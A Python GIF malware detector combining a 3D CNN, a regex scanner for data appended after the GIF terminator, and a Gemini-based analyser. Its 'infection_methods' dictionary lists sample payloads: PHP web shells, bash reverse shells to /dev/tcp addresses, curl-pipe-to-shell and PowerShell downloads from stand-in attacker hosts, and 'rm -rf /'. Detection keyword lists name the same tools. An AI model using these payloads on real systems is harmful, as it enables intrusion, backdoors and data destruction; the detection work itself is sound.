# import torch
# from torch import nn
# from PIL import Image, ImageSequence
# import torchvision.transforms as transforms
# import os

# # === Config ===
# IMAGE_SIZE = (50, 50)
# FRAMES = 25
# DEVICE = "cuda" if torch.cuda.is_available() else "cpu"

# # === CNN Model ===
# class MultiHeadCNN(nn.Module):
#     def __init__(self, num_methods):
#         super().__init__()
#         self.conv = nn.Sequential(
#             nn.Conv3d(3, 16, kernel_size=3, padding=1),
#             nn.ReLU(),
#             nn.MaxPool3d((1, 2, 2)),
#             nn.Conv3d(16, 32, kernel_size=3, padding=1),
#             nn.ReLU(),
#             nn.MaxPool3d((1, 2, 2)),
#         )
#         self.flatten = nn.Flatten()
#         self.shared_fc = nn.Linear(32 * FRAMES * 12 * 12, 128)
#         self.head_class = nn.Linear(128, 2)
#         self.head_method = nn.Linear(128, num_methods)

#     def forward(self, x):
#         x = self.flatten(self.conv(x))
#         shared = self.shared_fc(x)
#         return self.head_class(shared), self.head_method(shared)

# # === Dummy Stubs for ResNet3D and Transformer ===
# # Replace these with actual models later
# class ResNet3D(nn.Module):
#     def __init__(self, num_methods):
#         super().__init__()
#         self.fc = nn.Linear(1, 1)  # Placeholder
#     def forward(self, x):
#         return torch.randn((x.size(0), 2)), torch.randn((x.size(0), num_methods)) # type: ignore

# class TransformerModel(nn.Module):
#     def __init__(self, num_methods):
#         super().__init__()
#         self.fc = nn.Linear(1, 1)  # Placeholder
#     def forward(self, x):
#         return torch.randn((x.size(0), 2)), torch.randn((x.size(0), num_methods)) # type: ignore

# # === Load GIF as tensor ===
# transform = transforms.Compose([
#     transforms.Resize(IMAGE_SIZE),
#     transforms.ToTensor()
# ])

# def load_gif_tensor(gif_path):
#     frames = []
#     gif = Image.open(gif_path)
#     for i, frame in enumerate(ImageSequence.Iterator(gif)):
#         if i >= FRAMES:
#             break
#         frames.append(transform(frame.convert("RGB")))
#     while len(frames) < FRAMES:
#         frames.append(frames[-1])
#     video = torch.stack(frames).permute(1, 0, 2, 3)  # [C, T, H, W]
#     return video.unsqueeze(0).to(DEVICE)

# # === Predict Function ===
# def predict_gif(gif_path, model_name="cnn"):
#     model_name = model_name.lower()
#     model_map = {
#         "cnn": ("cnn_model.pth", MultiHeadCNN),
#         "resnet3d": ("resnet3d_model.pth", ResNet3D),
#         "transformer": ("transformer_model.pth", TransformerModel)
#     }

#     if model_name not in model_map:
#         return "error", f"Unknown model: {model_name}"

#     model_path, model_class = model_map[model_name]

#     if not os.path.exists(model_path):
#         return "error", f"Model file '{model_path}' not found."

#     try:
#         checkpoint = torch.load(model_path, map_location=DEVICE)
#         method_to_idx = checkpoint["method_to_idx"]
#         idx_to_method = {v: k for k, v in method_to_idx.items()}
#         model = model_class(num_methods=len(method_to_idx)).to(DEVICE)
#         model.load_state_dict(checkpoint["model_state_dict"])
#         model.eval()

#         tensor = load_gif_tensor(gif_path)
#         with torch.no_grad():
#             out_class, out_method = model(tensor)
#             class_idx = out_class.argmax(1).item()
#             method_idx = out_method.argmax(1).item()
#             label = "infected" if class_idx == 1 else "clean"
#             method = idx_to_method.get(method_idx, "unknown")
#             return label, method
#     except Exception as e:
#         return "error", str(e)



############################################################################
import torch
from torch import nn
from PIL import Image, ImageSequence
import torchvision.transforms as transforms
import os
import base64
import re
import json
try:
    from dotenv import load_dotenv
    load_dotenv()  # Load .env file
except ImportError:
    pass
try:
    import google.generativeai as genai
    GEMINI_AVAILABLE = True
except ImportError:
    GEMINI_AVAILABLE = False
# === Config ===
MODEL_PATH = "cnn__model.pth"
IMAGE_SIZE = (100, 100)
FRAMES = 25
DEVICE = "cuda" if torch.cuda.is_available() else "cpu"

infection_methods = {
    # PHP-Based Payloads
    "append_php_shell": "<?php @eval($_POST['cmd']); ?>",
    "append_php_base64": "<?php eval(base64_decode('ZWNobyAnaGVsbG8gd29ybGQnOw==')); ?>",
    "append_php_reverse_shell": "<?php system('/bin/bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"'); ?>",

    # JavaScript-Based Payloads
    "append_js_eval": "<script>eval(atob('YWxlcnQoIkZha2UgSW5mZWN0aW9uIik='));</script>",
    "append_js_fetch": "<script>fetch('https://httpbin.org/get').then(r => r.json()).then(console.log);</script>",
    "append_js_redirect": "<script>window.location='https://malicious.com'</script>",

    # HTML/Polyglot
    "polyglot_html_gif": "<html><body><h1>Not a gif!</h1><script>alert('PWNED')</script></body></html>",

    # Metadata/Stego
    "metadata_comment_php": "<?php system('ls'); ?>",
    "metadata_comment_backdoor": "<?php passthru($_GET['cmd']); ?>",

    # EXE-like Signature Payload (as bytes)
    "append_fake_exe_header": b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff",

    # Linux Shell Payloads
    "append_shell_reverse": "#!/bin/bash\nbash -i >& /dev/tcp/192.168.0.1/4444 0>&1",
    "append_shell_curl_dropper": "curl http://malicious.site/payload.sh | sh",

    # PowerShell-Based Payloads
    "append_powershell_base64": "powershell -EncodedCommand SQBFAFgAIAAiAEgAZQBsAGwAbwAiAA==",
    "append_powershell_webdl": "powershell -Command \"Invoke-WebRequest -Uri http://attacker.com/mal.exe -OutFile C:\\temp\\mal.exe\"",

    # Generic Suspicious Patterns
    "append_generic_base64": "U2FtcGxlIEJhc2U2NCBFbmNvZGVkIERhdGE=",
    "append_malicious_command": "rm -rf / --no-preserve-root"
}


# === CNN Model Definition ===
class MultiHeadCNN(nn.Module):
    def __init__(self, num_methods):
        super().__init__()
        self.conv = nn.Sequential(
            nn.Conv3d(3, 32, kernel_size=3, padding=1),
            nn.BatchNorm3d(32),
            nn.ReLU(),
            nn.MaxPool3d((1, 2, 2)),
            nn.Conv3d(32, 64, kernel_size=3, padding=1),
            nn.BatchNorm3d(64),
            nn.ReLU(),
            nn.MaxPool3d((1, 2, 2)),
        )
        self.flatten = nn.Flatten()
        self.shared_fc = nn.Linear(64 * FRAMES * 25 * 25, 256)
        self.head_class = nn.Linear(256, 2)
        self.head_method = nn.Linear(256, num_methods)

    def forward(self, x):
        x = self.flatten(self.conv(x))
        shared = self.shared_fc(x)
        return self.head_class(shared), self.head_method(shared)

# === GIF Loader ===
transform = transforms.Compose([
    transforms.Resize(IMAGE_SIZE),
    transforms.ToTensor()
])

def load_gif_tensor(gif_path):
    frames = []
    gif = Image.open(gif_path)
    for i, frame in enumerate(ImageSequence.Iterator(gif)):
        if i >= FRAMES:
            break
        frames.append(transform(frame.convert("RGB")))
    while len(frames) < FRAMES:
        frames.append(frames[-1])
    video = torch.stack(frames).permute(1, 0, 2, 3)  # [C, T, H, W]
    return video.unsqueeze(0).to(DEVICE)

# # === Extract payload manually (not predicted)
# def extract_payload(content: bytes):
#     content_str = content.decode(errors='ignore')
#     for method, pattern in infection_methods.items():
#         if isinstance(pattern, bytes):
#             if pattern in content:
#                 return method, pattern.decode(errors='ignore')
#         else:
#             if pattern in content_str:
#                 if "base64:" in pattern:
#                     try:
#                         b64_data = pattern.split("base64:")[1].strip()
#                         decoded = base64.b64decode(b64_data).decode()
#                         return method, f"{pattern}\nDecoded base64: {decoded}"
#                     except Exception:
#                         return method, f"{pattern}\n[Failed to decode base64]"
#                 return method, pattern
#     return "none", "No malicious pattern found"


def extract_payload(content: bytes):
    """
    Extract potential malicious payloads from GIF file.
    Focuses on appended data and actual code, not normal GIF structure.
    """
    findings = []
    content_str = content.decode(errors='ignore', encoding='latin-1')  # Use latin-1 to preserve all bytes

    # Find GIF terminator (0x00 0x3B) - data after this is suspicious
    gif_terminator = b'\x00\x3B'
    terminator_pos = content.rfind(gif_terminator)
    
    # Focus analysis on appended data (after GIF terminator) and metadata areas
    if terminator_pos > 0 and terminator_pos < len(content) - 2:
        appended_data = content[terminator_pos + 2:]
        appended_str = appended_data.decode(errors='ignore', encoding='latin-1')
        
        # Analyze appended data more thoroughly
        if len(appended_data) > 10:  # Only if there's significant appended data
            # === 1. Detect base64 strings in appended data ===
            base64_matches = re.findall(r'(?:[A-Za-z0-9+/]{30,}={0,2})', appended_str)
            for match in base64_matches:
                try:
                    decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                    # Only flag if decoded content looks like code/commands
                    if any(s in decoded.lower() for s in ['cmd', 'powershell', 'http', 'bash', 'wget', 'curl', 'exec', 'eval', 'system', 'shell']):
                        findings.append({
                            'type': 'base64_payload',
                            'location': 'appended_data',
                            'encoded': match[:50] + '...' if len(match) > 50 else match,
                            'decoded': decoded[:200] + '...' if len(decoded) > 200 else decoded
                        })
                except Exception:
                    continue

            # === 2. Suspicious code patterns in appended data ===
            suspicious_patterns = [
                (r'<\?php.*?\?>', 'php_script'),
                (r'<script[^>]*>.*?</script>', 'javascript'),
                (r'\beval\s*\(', 'eval_call'),
                (r'\bexec\s*\(', 'exec_call'),
                (r'os\.system\s*\(', 'system_call'),
                (r'cmd\.exe\s+/c', 'cmd_execution'),
                (r'powershell\s+-[eE]', 'powershell_encoded'),
                (r'bash\s+-[ic]', 'bash_execution'),
                (r'curl\s+http', 'curl_download'),
                (r'wget\s+http', 'wget_download'),
                (r'rm\s+-rf\s+/', 'dangerous_rm'),
            ]

            for pat, pat_type in suspicious_patterns:
                matches = re.findall(pat, appended_str, re.IGNORECASE | re.DOTALL)
                for m in matches[:3]:  # Limit to first 3 matches
                    findings.append({
                        'type': 'suspicious_pattern',
                        'pattern_type': pat_type,
                        'location': 'appended_data',
                        'match': m[:100] + '...' if len(m) > 100 else m.strip()
                    })

    # === 3. Analyze entire file for high-confidence threats ===
    # Look for complete malicious code blocks (not just fragments)
    complete_scripts = re.findall(r'<\?php\s+.*?\?>', content_str, re.IGNORECASE | re.DOTALL)
    for script in complete_scripts:
        if any(keyword in script.lower() for keyword in ['eval', 'exec', 'system', 'shell_exec', 'passthru']):
            findings.append({
                'type': 'complete_malicious_script',
                'location': 'file_content',
                'match': script[:300] + '...' if len(script) > 300 else script
            })

    # === 4. URLs and IPs (only if in suspicious context) ===
    # Only flag URLs/IPs if they appear with other suspicious content
    if findings:  # Only check URLs if we already found something suspicious
        urls = re.findall(r'https?://[^\s\'"<>]+', content_str)
        for url in urls[:5]:  # Limit to first 5
            # Skip common image hosting URLs that might be in metadata
            if not any(domain in url.lower() for domain in ['imgur.com', 'giphy.com', 'tenor.com', 'gstatic.com']):
                findings.append({'type': 'suspicious_url', 'match': url})

    # === Return summarized result ===
    if findings:
        readable = "=== POTENTIAL THREATS DETECTED ===\n"
        for item in findings:
            if item['type'] == 'base64_payload':
                readable += f"\n[Base64 Payload - {item.get('location', 'unknown')}]\n"
                readable += f"Encoded: {item['encoded']}\n"
                readable += f"Decoded: {item['decoded']}\n"
            elif item['type'] == 'complete_malicious_script':
                readable += f"\n[Complete Malicious Script - {item.get('location', 'unknown')}]\n"
                readable += f"{item['match']}\n"
            else:
                readable += f"\n[{item.get('pattern_type', item['type']).upper()} - {item.get('location', 'unknown')}]\n"
                readable += f"{item['match']}\n"
        return "suspicious", readable.strip()
    else:
        return "clean", "No malicious patterns detected. File structure appears normal."

# === Advanced Pattern Recognition Analysis ===
def analyze_gif_with_gemini(gif_path, api_key=None):
    """
    Analyze GIF using advanced pattern recognition by extracting metadata and suspicious patterns.
    Returns similar format to CNN model for consistency.
    """
    if not GEMINI_AVAILABLE:
        return {
            "prediction": "error",
            "model_method": "advanced_analysis",
            "payload_detected": "none",
            "extracted_payload": "Advanced analysis engine not available. Please install required dependencies."
        }
    
    if not api_key:
        # Try to get from environment variable
        api_key = os.getenv("GEMINI_API_KEY")
        if not api_key:
            return {
                "prediction": "error",
                "model_method": "advanced_analysis",
                "payload_detected": "none",
                "extracted_payload": "Analysis engine configuration required. Please set GEMINI_API_KEY environment variable."
            }
    
    try:
        # Configure analysis engine
        genai.configure(api_key=api_key)
        # Use best models for malware detection - optimized for analysis tasks
        # Priority: 1) Gemini 2.5 Flash (best price-performance, high volume, low latency)
        #           2) Gemini 3 Flash Preview (most intelligent + fast)
        #           3) Gemini 2.0 Flash (stable fallback)
        #           4) Gemini 1.5 Flash (widely available fallback)
        model = None
        model_names = [
            'gemini-2.5-flash',           # Best price-performance, best for high volume tasks
            'gemini-3-flash-preview',     # Most intelligent + fast
            'gemini-2.0-flash',           # Stable second generation
            'gemini-1.5-flash',           # Widely available fallback
            'gemini-1.5-pro'              # Pro fallback
        ]
        
        for model_name in model_names:
            try:
                model = genai.GenerativeModel(model_name)
                break  # Successfully created model, exit loop
            except Exception as e:
                continue  # Try next model name
        
        if model is None:
            return {
                "prediction": "error",
                "model_method": "advanced_analysis",
                "payload_detected": "none",
                "extracted_payload": "No compatible analysis model available."
            }
        
        # Read GIF file
        with open(gif_path, "rb") as f:
            gif_content = f.read()
        
        # Extract metadata and analyze content
        gif_info = {}
        try:
            img = Image.open(gif_path)
            gif_info = {
                "format": img.format,
                "size": img.size,
                "mode": img.mode,
                "frames": getattr(img, 'n_frames', 1),
                "has_transparency": img.info.get('transparency', False),
                "duration": img.info.get('duration', 0),
                "loop": img.info.get('loop', 0)
            }
        except Exception as e:
            gif_info["error"] = str(e)
        
        # Extract text patterns from binary content
        content_str = gif_content.decode(errors='ignore')
        file_size = len(gif_content)
        
        # Look for suspicious patterns with detailed extraction
        suspicious_findings = extract_payload(gif_content)
        
        # Extract hex representation for analysis (first 1000 bytes in hex)
        hex_content = gif_content[:1000].hex()
        hex_pairs = ' '.join([hex_content[i:i+2] for i in range(0, min(len(hex_content), 200), 2)])
        
        # Analyze file structure - check for valid GIF header
        has_valid_gif_header = gif_content[:6] == b'GIF89a' or gif_content[:6] == b'GIF87a'
        
        # Check for appended data (common malware technique)
        gif_end_marker = b'\x00\x3B'  # GIF terminator
        gif_terminator_pos = gif_content.rfind(gif_end_marker)
        has_appended_data = gif_terminator_pos > 0 and gif_terminator_pos < len(gif_content) - 2
        
        # Extract readable strings (potential payloads)
        readable_strings = re.findall(r'[ -~]{10,}', content_str)  # Printable ASCII strings of 10+ chars
        suspicious_strings = [s for s in readable_strings if any(keyword in s.lower() for keyword in 
            ['eval', 'exec', 'system', 'cmd', 'powershell', 'bash', 'curl', 'wget', 'http', 'php', 'script', 'base64'])]
        
        # Prepare comprehensive prompt for Gemini
        prompt = f"""You are a senior cybersecurity analyst specializing in file-based malware detection. Analyze this GIF file THOROUGHLY and ACCURATELY.

CRITICAL ANALYSIS REQUIREMENTS:
- DO NOT mark files as "infected" based solely on random hex data or normal GIF structure
- Only mark as "infected" if you find ACTUAL malicious code, scripts, or executable payloads
- Normal GIF metadata, color tables, and image data are NOT malicious
- Look for APPENDED data after the GIF terminator (0x00 0x3B)
- Analyze actual readable strings and code, not binary image data

GIF FILE STRUCTURE ANALYSIS:
- File Size: {file_size} bytes
- Format: {gif_info.get('format', 'Unknown')}
- Dimensions: {gif_info.get('size', 'Unknown')}
- Frames: {gif_info.get('frames', 'Unknown')}
- Duration: {gif_info.get('duration', 'Unknown')} ms
- Valid GIF Header: {'Yes' if has_valid_gif_header else 'No'}
- Appended Data After Terminator: {'Yes - Potential payload location' if has_appended_data else 'No - Normal GIF structure'}

EXTRACTED PATTERNS FROM FILE:
{suspicious_findings[1] if suspicious_findings[0] == 'suspicious' else 'No obvious suspicious patterns found in initial scan.'}

SUSPICIOUS READABLE STRINGS FOUND:
{chr(10).join(suspicious_strings[:20]) if suspicious_strings else 'None found - file appears to contain only normal GIF data'}

FILE CONTENT ANALYSIS (Readable text portions, first 3000 characters):
{content_str[:3000] if len(content_str) > 0 else 'No readable text content found'}

HEX ANALYSIS (First 200 bytes for structure verification):
{hex_pairs}

ANALYSIS INSTRUCTIONS:
1. First, verify this is a valid GIF file structure
2. Check if there is data appended AFTER the GIF terminator (0x00 0x3B) - this is where malware is often hidden
3. Analyze ONLY the readable strings and code portions - ignore binary image data
4. Look for actual executable code: PHP scripts, JavaScript, shell commands, base64-encoded payloads
5. Distinguish between:
   - Normal GIF metadata/headers (SAFE)
   - Image pixel data (SAFE)
   - Appended malicious code (DANGEROUS)
   - Embedded scripts in comments/metadata (DANGEROUS)

RESPONSE REQUIREMENTS:
- Be ACCURATE: Only mark as "infected" if you find REAL malicious content
- Be SPECIFIC: Explain exactly what you found and where
- Extract ACTUAL payloads: Show the malicious code/commands found
- If clean: Explain why (normal GIF structure, no appended data, no malicious strings)

Respond in JSON format:
{{
    "prediction": "infected" or "clean",
    "method": "detection_method_name (e.g., 'metadata_injection', 'appended_payload', 'steganography', 'polyglot_file', 'suspicious_script', 'clean')",
    "explanation": "Detailed explanation of your analysis. If infected, explain what malicious content was found and how it could be executed. If clean, explain why the file is safe.",
    "risk_level": "low/medium/high/none",
    "extracted_payload": "The actual malicious code, commands, or suspicious content found. If clean, state 'No malicious payload detected - file contains only normal GIF image data.'"
}}"""

        # Get response from analysis engine with safety settings
        generation_config = {
            "temperature": 0.1,  # Low temperature for more deterministic, accurate analysis
            "top_p": 0.95,
            "top_k": 40,
            "max_output_tokens": 2048,
        }
        
        safety_settings = [
            {"category": "HARM_CATEGORY_HARASSMENT", "threshold": "BLOCK_NONE"},
            {"category": "HARM_CATEGORY_HATE_SPEECH", "threshold": "BLOCK_NONE"},
            {"category": "HARM_CATEGORY_SEXUALLY_EXPLICIT", "threshold": "BLOCK_NONE"},
            {"category": "HARM_CATEGORY_DANGEROUS_CONTENT", "threshold": "BLOCK_NONE"},
        ]
        
        response = model.generate_content(
            prompt,
            generation_config=generation_config,
            safety_settings=safety_settings
        )
        
        # Safely extract response text
        if hasattr(response, 'text') and response.text:
            response_text = str(response.text).strip()
        elif isinstance(response, dict):
            response_text = str(response).strip()
        else:
            response_text = str(response).strip()
        
        # Try to parse JSON from response
        # Sometimes response wraps JSON in markdown code blocks
        if isinstance(response_text, str):
            if "```json" in response_text:
                response_text = response_text.split("```json")[1].split("```")[0].strip()
            elif "```" in response_text:
                response_text = response_text.split("```")[1].split("```")[0].strip()
        else:
            response_text = str(response_text)
        
        try:
            result = json.loads(response_text)
            
            # Safely get prediction with type checking
            prediction_raw = result.get("prediction", "clean")
            if isinstance(prediction_raw, str):
                prediction = prediction_raw.lower().strip()
            else:
                prediction = str(prediction_raw).lower().strip()
            
            # Validate prediction - must be either "infected" or "clean"
            if prediction not in ["infected", "clean"]:
                # If invalid, analyze the explanation to determine
                explanation_raw = result.get("explanation", "")
                explanation = str(explanation_raw).lower() if explanation_raw else ""
                if any(word in explanation for word in ["malicious", "malware", "payload", "threat", "dangerous", "suspicious code"]):
                    prediction = "infected"
                else:
                    prediction = "clean"
            
            # Get extracted payload - prioritize extracted_payload field with type checking
            extracted_payload_raw = result.get("extracted_payload", "")
            if isinstance(extracted_payload_raw, str):
                extracted_payload = extracted_payload_raw.strip()
            else:
                extracted_payload = str(extracted_payload_raw).strip()
            
            if not extracted_payload or extracted_payload == "":
                explanation_raw = result.get("explanation", "Analysis completed - no payload extracted")
                extracted_payload = str(explanation_raw) if explanation_raw else "Analysis completed - no payload extracted"
            
            # Get method with type checking
            method_raw = result.get("method", "advanced_analysis")
            if isinstance(method_raw, str):
                method = method_raw.strip()
            else:
                method = str(method_raw).strip()
            
            if not method or method == "":
                method = "advanced_analysis"
            
            return {
                "prediction": prediction,
                "model_method": method,
                "payload_detected": method if prediction == "infected" else "clean",
                "extracted_payload": extracted_payload
            }
        except json.JSONDecodeError as e:
            # If JSON parsing fails, try to extract information from text more intelligently
            response_lower = str(response_text).lower() if response_text else ""
            
            # More careful analysis - look for clear indicators
            has_clear_threat = any(phrase in response_lower for phrase in [
                "malicious code", "malware detected", "infected file", "payload found",
                "suspicious script", "executable code", "malicious payload"
            ])
            
            has_clear_clean = any(phrase in response_lower for phrase in [
                "clean file", "no malicious", "safe file", "normal gif", "no threat",
                "no payload", "legitimate file"
            ])
            
            if has_clear_threat and not has_clear_clean:
                prediction = "infected"
            elif has_clear_clean and not has_clear_threat:
                prediction = "clean"
            else:
                # Ambiguous - default to clean to avoid false positives
                prediction = "clean"
            
            # Safely truncate response_text for display
            response_display = str(response_text)[:500] if response_text else "No response text available"
            
            return {
                "prediction": prediction,
                "model_method": "advanced_analysis",
                "payload_detected": "pattern_detected" if prediction == "infected" else "clean",
                "extracted_payload": f"Analysis response (JSON parsing failed): {response_display}"
            }
            
    except Exception as e:
        return {
            "prediction": "error",
            "model_method": "advanced_analysis",
            "payload_detected": "none",
            "extracted_payload": f"Error during analysis: {str(e)}"
        }

# === Inference Entry Point ===
def predict_gif(gif_path, model_type="cnn", gemini_api_key=None):
    """
    Predict GIF malware status using either CNN or advanced analysis model.
    
    Args:
        gif_path: Path to GIF file
        model_type: "cnn" for CNN model, "llm" for advanced analysis
        gemini_api_key: Optional API key (can also use GEMINI_API_KEY env var)
    
    Returns:
        Dictionary with prediction results
    """
    if model_type == "llm":
        return analyze_gif_with_gemini(gif_path, gemini_api_key)
    
    # CNN Model (default)
    if not os.path.exists(MODEL_PATH):
        return {
            "prediction": "error",
            "model_method": "unknown",
            "payload_detected": "none",
            "extracted_payload": "Model not found."
        }

    tensor = load_gif_tensor(gif_path)
    checkpoint = torch.load(MODEL_PATH, map_location=DEVICE)
    method_to_idx = checkpoint["method_to_idx"]
    idx_to_method = {v: k for k, v in method_to_idx.items()}

    model = MultiHeadCNN(num_methods=len(method_to_idx)).to(DEVICE)
    model.load_state_dict(checkpoint["model_state_dict"])
    model.eval()

    with torch.no_grad():
        out_class, out_method = model(tensor)
        class_idx = out_class.argmax(1).item()
        method_idx = out_method.argmax(1).item()

        label = "infected" if class_idx == 1 else "clean"
        model_method = idx_to_method.get(method_idx, "unknown")

    with open(gif_path, "rb") as f:
        content = f.read()
        detected_method, extracted_payload = extract_payload(content)

    return {
        "prediction": label,
        "model_method": model_method,
        "payload_detected": detected_method,
        "extracted_payload": extracted_payload
    }
